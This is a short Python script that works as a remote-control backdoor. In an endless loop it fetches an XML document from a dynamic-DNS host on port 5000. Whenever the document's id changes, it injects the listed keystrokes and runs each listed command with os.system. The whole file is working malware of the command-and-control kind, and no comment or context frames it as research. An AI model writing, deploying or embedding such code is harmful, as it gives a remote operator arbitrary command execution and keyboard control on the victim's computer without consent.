import xml.etree.ElementTree as ET
import requests
import time
import os
import keyboard as kb

def extract_content(xml_string, tag_name):
    root = ET.fromstring(xml_string)
    content = root.find(tag_name).text
    return content


def get_xml_content(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: Unable to fetch the XML file. Status code: {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"


url = 'http://corveric.ddns.net:5000/xml' 
old_id = 99999999
while True:
    try:
        xml_content = get_xml_content(url)
    except:
        pass

    upd = extract_content(xml_content, "update")
    ide = extract_content(xml_content, "id")
    if not ide == old_id:
        old_id = ide
        try:
            keys = extract_content(xml_content, "keys").split("*")
        except:
            keys = []
        try:
            cmds = extract_content(xml_content, "cmd").split("*")
        except:
            cmds = []

        for key in keys:
            kb.press_and_release(key)
            time.sleep(0.2)

        for cmd in cmds:
            os.system(cmd)
            time.sleep(0.2)

    time.sleep(5)
